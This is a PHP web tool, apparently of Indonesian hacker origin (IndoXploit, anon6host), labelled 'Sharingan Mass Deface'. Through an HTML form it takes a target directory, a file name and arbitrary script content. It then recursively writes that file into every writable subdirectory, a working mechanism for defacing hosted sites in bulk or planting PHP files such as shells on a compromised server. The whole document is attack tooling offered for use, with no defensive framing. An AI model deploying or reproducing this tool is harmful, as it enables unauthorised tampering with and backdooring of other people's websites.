<?php
// Tu5b0l3d -IndoXploit-
// http://indoxploit.blogspot.co.id/2016/04/tool-mass-deface.html
// anon6host.my.id

function bikin_file($namafile,$script){
$fp2 = fopen($namafile,"w");
fputs($fp2,$script);

}
function buka_dir($getcwd){
	if(is_writable($getcwd)){
	$nama = $_POST['nama'];
	$script = $_POST['script'];
	$a = scandir("$getcwd");
foreach($a as $aa){
	if($aa == "." | $aa == ".."){
	}elseif(is_dir("$getcwd/$aa")){

		$dir_baru = "$getcwd/$aa";
		if(is_writable($dir_baru)){
		echo "$dir_baru/$nama <== sukses<br>";
		$create_file = bikin_file("$dir_baru/$nama", "$script");
		$baa = buka_dir($dir_baru);
	}
	else{
		echo "Dir ngk writeable";
	}
}
}	
}
else{
	echo "Dir ngk Writeable";
}
}
if($_POST){
$cwd = $_POST['dir'];
$coba = buka_dir($cwd);
echo $coba;
}
else{
	echo '<html>
	<head>
		<title>MassDepes</title>
	</head>

	<body>
			<center><br> <img border="0" src="https://media.tenor.com/X72Xa_kBtvUAAAAi/sharingan.gif" width="200" height="200"><br>
				<font face="arial"><h2>ANON<font color="red">6</font>HOST.MY.ID<br> Sharingan Mass Deface ! </h2><hr></font>
						<table>
							<tr><td><form method="post" action="?action"></td></tr>
							<tr><td><input type="text" name="dir" placeholder="Dir"></td> </tr>
							<tr><td><input type="text" name="nama" placeholder="h.php / Nama Filenya"></td> </tr>
							<tr><td><textarea rows="10" cols="19px" name="script" placeholder="Hacked By anon6host / Your Script"></textarea></td></tr>

							<br><tr><td><input type="submit" value="Submit"></td></tr>
							</form>
						</table>
						<font color="red">*sekedar mengingatkan, untuk selalu membackup apabila tebas index.</font>
			</center>

	</body>
</html>';
}
?>